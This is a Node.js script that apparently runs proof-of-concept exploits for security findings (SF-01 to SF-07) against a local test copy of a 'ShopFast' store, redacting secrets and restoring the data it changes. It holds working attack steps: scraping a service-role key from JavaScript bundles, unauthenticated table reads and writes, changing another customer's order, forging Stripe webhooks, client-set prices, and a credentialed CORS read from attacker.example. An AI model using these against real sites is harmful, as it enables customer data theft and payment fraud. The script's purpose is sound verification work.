// Runs the ShopFast proofs of concept end to end and writes redacted results to
// poc/out/results.txt. Usage: npm run poc   (builds first, then runs this file)
// Works on Windows, macOS and Linux. Needs Node 20+ and a filled-in .env.local.
import { spawn } from 'node:child_process'
import fs from 'node:fs'
import { createServerClient } from '@supabase/ssr'

// ---- env ------------------------------------------------------------------
for (const line of fs.readFileSync('.env.local', 'utf8').split(/\r?\n/)) {
  const m = line.match(/^([A-Z0-9_]+)=(.*)$/)
  if (m && !process.env[m[1]]) process.env[m[1]] = m[2].trim()
}
const URL_ = process.env.NEXT_PUBLIC_SUPABASE_URL
const ANON = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
const SRK = process.env.SUPABASE_SERVICE_ROLE_KEY
const PW = process.env.TEST_USER_PASSWORD
const BASE = 'http://localhost:3000'
if (!SRK || SRK.includes('PASTE')) { console.error('Paste the service-role key into .env.local first.'); process.exit(2) }

// ---- output -----------------------------------------------------------------
fs.mkdirSync('poc/out', { recursive: true })
const lines = []
const redact = (s) => String(s)
  .replace(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g, (t) => t.slice(0, 20) + '…[REDACTED]')
  .replace(/base64-[A-Za-z0-9_-]+/g, 'base64-…[REDACTED]')
  .replace(/sk_(test|live)_[A-Za-z0-9]+/g, 'sk_$1_…[REDACTED]')
const out = (...a) => { const l = redact(a.join(' ')); lines.push(l); console.log(l) }
const section = (t) => out(`\n===== ${t} =====`)

// ---- helpers ----------------------------------------------------------------
const rest = async (path, opts = {}, key = SRK) => {
  const r = await fetch(`${URL_}/rest/v1/${path}`, { ...opts, headers: {
    apikey: key, Authorization: `Bearer ${key}`, 'Content-Type': 'application/json',
    Prefer: 'return=representation', ...(opts.headers || {}) } })
  const text = await r.text()
  let body; try { body = JSON.parse(text) } catch { body = text }
  return { status: r.status, body }
}
async function loginCookie(email) {
  const jar = new Map()
  const sb = createServerClient(URL_, ANON, { cookies: {
    getAll: () => [...jar].map(([name, value]) => ({ name, value })),
    setAll: (list) => list.forEach(({ name, value }) => (value ? jar.set(name, value) : jar.delete(name))),
  } })
  const { error } = await sb.auth.signInWithPassword({ email, password: PW })
  if (error) throw new Error(`login ${email}: ${error.message}`)
  return [...jar].map(([n, v]) => `${n}=${v}`).join('; ')
}
const app = async (path, opts = {}) => {
  const r = await fetch(BASE + path, opts)
  const text = await r.text()
  let body; try { body = JSON.parse(text) } catch { body = text }
  return { status: r.status, headers: r.headers, body }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

// ---- start stand-ins and the app -------------------------------------------
const kids = [
  spawn(process.execPath, ['poc/standins.mjs'], { stdio: 'ignore' }),
  spawn(process.execPath, ['node_modules/next/dist/bin/next', 'start', '-p', '3000'], { stdio: 'ignore', env: process.env }),
]
const stop = () => kids.forEach((k) => { try { k.kill() } catch {} })
process.on('exit', stop)
for (let i = 0; i < 60; i++) {
  try { if ((await fetch(BASE + '/login')).ok) break } catch {}
  await sleep(1000)
}

out(`ShopFast proofs of concept, run ${new Date().toISOString()} on ${process.platform}, Node ${process.version}`)
out('Stripe and OpenAI calls go to local stand-ins (poc/standins.mjs). Keys and session cookies are redacted.')

try {
  // ===== SF-01 =====
  section('SF-01 Master database key shipped to every visitor')
  const html = (await app('/login')).body
  const chunks = [...new Set(String(html).match(/\/_next\/static\/chunks\/[^"]*\.js/g) || [])]
  let found = null
  for (const c of chunks) {
    const js = (await app(c)).body
    for (const t of String(js).match(/eyJhbGciOi[A-Za-z0-9._-]+/g) || []) {
      const payload = JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString())
      if (payload.role === 'service_role') { found = t; out(`found in ${c}`); out(`  token:   ${t}`); out(`  payload role: ${payload.role}`) }
    }
  }
  if (found) {
    const r = await rest('profiles?select=email,shipping_address', {}, found)
    out(`using the token from the bundle: GET /rest/v1/profiles -> HTTP ${r.status}, ${Array.isArray(r.body) ? r.body.length : 0} rows`)
    for (const p of r.body || []) out(`  ${p.email} | ${p.shipping_address}`)
  } else out('no service_role token found in the bundle')

  // ===== SF-02 over HTTP =====
  section('SF-02 Customer and order tables have no access rules (public anon key, over HTTP)')
  const a = await rest('orders?select=id,user_id,total_cents,shipping_address&order=id', {}, ANON)
  out(`GET /rest/v1/orders with the anon key -> HTTP ${a.status}`)
  for (const o of a.body || []) out(`  ${o.id} | ${String(o.user_id).slice(0, 8)}… | ${o.total_cents} | ${o.shipping_address}`)
  const w = await rest('orders?id=eq.1041', { method: 'PATCH', body: JSON.stringify({ status: 'paid' }) }, ANON)
  out(`PATCH /rest/v1/orders?id=eq.1041 {"status":"paid"} with the anon key -> HTTP ${w.status}, now: ${JSON.stringify((w.body || [])[0]?.status)}`)
  await rest('orders?id=eq.1041', { method: 'PATCH', body: JSON.stringify({ status: 'pending' }) })
  out('(restored to pending)')

  // ===== SF-04 =====
  section('SF-04 Any customer can read and change any order')
  const alice = await loginCookie('alice@shopfast.test')
  out('signed in as alice@shopfast.test (her order is 1042); requesting Bob\'s order 1041')
  const g = await app('/api/orders/1041', { headers: { Cookie: alice } })
  const original = g.body?.shipping_address
  out(`GET /api/orders/1041 -> HTTP ${g.status} {"id":${g.body?.id},"user_id":"${String(g.body?.user_id).slice(0, 8)}…","shipping_address":"${original}"}`)
  const p = await app('/api/orders/1041', { method: 'PATCH', headers: { Cookie: alice, 'Content-Type': 'application/json' },
    body: JSON.stringify({ shipping_address: 'ATTACKER ADDRESS (test)' }) })
  out(`PATCH /api/orders/1041 {"shipping_address":"ATTACKER ADDRESS (test)"} -> HTTP ${p.status} ${JSON.stringify(p.body)}`)
  const g2 = await app('/api/orders/1041', { headers: { Cookie: alice } })
  out(`GET /api/orders/1041 again -> shipping_address: "${g2.body?.shipping_address}"`)
  await rest('orders?id=eq.1041', { method: 'PATCH', body: JSON.stringify({ shipping_address: original }) })
  out('(restored original address)')

  // ===== SF-05 =====
  section('SF-05 Payment confirmations can be faked')
  await rest('orders?id=eq.1042', { method: 'PATCH', body: JSON.stringify({ status: 'pending' }) })
  out(`order 1042 status before: ${(await rest('orders?id=eq.1042&select=status')).body[0]?.status}`)
  const f = await app('/api/stripe/webhook', { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ type: 'checkout.session.completed', data: { object: { payment_status: 'paid', metadata: { order_id: '1042' } } } }) })
  out(`POST /api/stripe/webhook (forged, no Stripe-Signature header) -> HTTP ${f.status} ${JSON.stringify(f.body)}`)
  out(`order 1042 status after: ${(await rest('orders?id=eq.1042&select=status')).body[0]?.status}`)
  await rest('orders?id=eq.1042', { method: 'PATCH', body: JSON.stringify({ status: 'pending' }) })
  out('(restored to pending)')

  // ===== SF-06 =====
  section('SF-06 Customers can set their own price')
  const real = (await rest('products?id=eq.1&select=name,price_cents')).body[0]
  out(`catalog price of product 1 (${real.name}): ${real.price_cents} cents`)
  const c = await app('/api/checkout', { method: 'POST', headers: { Cookie: alice, 'Content-Type': 'application/json' },
    body: JSON.stringify({ productId: 1, productName: real.name, price: 50, quantity: 1 }) })
  out(`POST /api/checkout {"productId":1,"price":50,"quantity":1} as alice -> HTTP ${c.status} orderId=${c.body?.orderId}`)
  const ord = (await rest(`orders?id=eq.${c.body?.orderId}&select=total_cents,status`)).body[0]
  out(`new order ${c.body?.orderId}: total_cents=${ord?.total_cents}, status=${ord?.status}`)
  const log = fs.readFileSync('poc/out/stripe-requests.log', 'utf8').trim().split('\n').pop()
  const s = JSON.parse(log)
  out(`what the app sent to Stripe: unit_amount=${s.params['line_items[0][price_data][unit_amount]']}, quantity=${s.params['line_items[0][quantity]']} -> amount_total=${s.response.amount_total} cents`)
  await rest(`orders?id=eq.${c.body?.orderId}`, { method: 'DELETE' })
  out('(test order deleted)')

  // ===== SF-07 =====
  section('SF-07 Other websites can read a logged-in customer\'s data')
  const m = await app('/api/me', { headers: { Cookie: alice, Origin: 'https://attacker.example' } })
  out(`GET /api/me with Origin: https://attacker.example and alice's cookie -> HTTP ${m.status}`)
  out(`  access-control-allow-origin: ${m.headers.get('access-control-allow-origin')}`)
  out(`  access-control-allow-credentials: ${m.headers.get('access-control-allow-credentials')}`)
  out(`  body: ${JSON.stringify({ email: m.body?.email, shipping_address: m.body?.shipping_address, orders: m.body?.orders?.length })}`)
} catch (e) {
  out(`ERROR: ${e.message}`)
} finally {
  fs.writeFileSync('poc/out/results.txt', lines.join('\n') + '\n')
  console.log('\nWrote poc/out/results.txt')
  stop()
  process.exit(0)
}
